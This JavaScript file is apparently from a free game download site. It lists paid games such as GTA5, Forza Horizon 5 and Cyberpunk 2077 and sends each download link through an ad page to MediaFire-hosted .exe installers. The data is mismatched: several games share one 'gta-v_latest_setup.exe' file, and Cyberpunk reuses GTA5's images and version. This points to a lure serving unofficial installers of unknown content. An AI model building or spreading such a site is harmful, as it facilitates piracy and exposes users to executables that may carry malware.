document.addEventListener("DOMContentLoaded", () => {
    const games = {
        "forzahorizon-5": {
            title: "Forza Horizon 5 -- VIP",
            category: "Racing, Open World",
            developer: "Microsoft",
            description: "Forza Horizon 5 is an open-world racing game...",
            version: "653.463 UPI",
            size: "105GB",
            updateDate: "Aug 11, 2024",
            gameIcon: "img/forzahorizon5/logo.jpg",
            screenshots: ["img/forzahorizon5/shot1.jpg", "img/forzahorizon5/shot2.jpg"],
            downloadUrl: "https://www.mediafire.com/file/5plvpywpsac59nm/7l_gta-v_latest_setup.exe/file"
        },
        "gta5": {
            title: "GTA5",
            category: "Open World, Action",
            developer: "Rockstar Games",
            description: "An epic adventure of crime, chaos, and conspiracy set in the sprawling, sun-soaked metropolis of Los Santos.",
            version: "1.0.3274",
            size: "Required 160GB, Installation 60gb",
            updateDate: "July 17, 2024",
            gameIcon: "img/gta5/logo.png",
            screenshots: ["img/gta5/shot1.jpg", "img/gta5/shot2.jpg"],
            downloadUrl: "https://www.mediafire.com/file/5plvpywpsac59nm/7l_gta-v_latest_setup.exe/file"
        },
        "palworld": {
            title: "Palworld",
            category: "Open World, Adventure",
            developer: "Pocketpair",
            description: "Palworld is an open-world survival and crafting game developed by Pocketpair. In this game, you fight, farm, build, and work alongside mysterious creatures called 'Pals'. It combines elements of monster-catching, training, base building, and exploration.",
            version: "0.4.12.64723",
            size: "R40gb (SSD Recommended)",
            updateDate: "December 26, 2024",
            gameIcon: "img/palworld/logo.jpg",
            screenshots: ["img/palworld/shot1.jpg", "img/palworld/shot2.jpg"],
            downloadUrl: "https://www.mediafire.com/file/uzzo2b1b3i9r968/7l_palworld_installer.exe/file"
        },
        "cyberpunk2077": {
            title: "Cyberpunk 2077",
            category: "Open World, Action",
            developer: "CD Projekt Red",
            description: "Cyberpunk 2077 is an open-world, action-adventure RPG set in a dystopian future where technology and body modifications intertwine with society's underbelly.",
            version: "1.0.3274",
            size: "Required 160GB, Installation 60gb",
            updateDate: "July 17, 2024",
            gameIcon: "img/gta5/logo.png",
            screenshots: ["img/gta5/shot1.jpg", "img/gta5/shot2.jpg"],
            downloadUrl: "https://www.mediafire.com/file/5plvpywpsac59nm/7l_gta-v_latest_setup.exe/file"
        }
    };

    const urlParams = new URLSearchParams(window.location.search);
    const gameKey = urlParams.get("game");
    const game = games[gameKey];

    if (game) {
        document.querySelector(".game-icon").src = game.gameIcon;
        document.getElementById("game-title").textContent = game.title;
        document.getElementById("game-category").textContent = `Category: ${game.category}`;
        document.getElementById("game-developer").textContent = `Developer: ${game.developer}`;
        document.getElementById("game-description").textContent = game.description;
        document.getElementById("game-version").textContent = game.version;
        document.getElementById("game-size").textContent = game.size;
        document.getElementById("update-date").textContent = game.updateDate;

        const adPageUrl = `ad-page1.html?downloadUrl=${encodeURIComponent(game.downloadUrl)}`;
        document.getElementById("download-link").href = adPageUrl;
    }
});
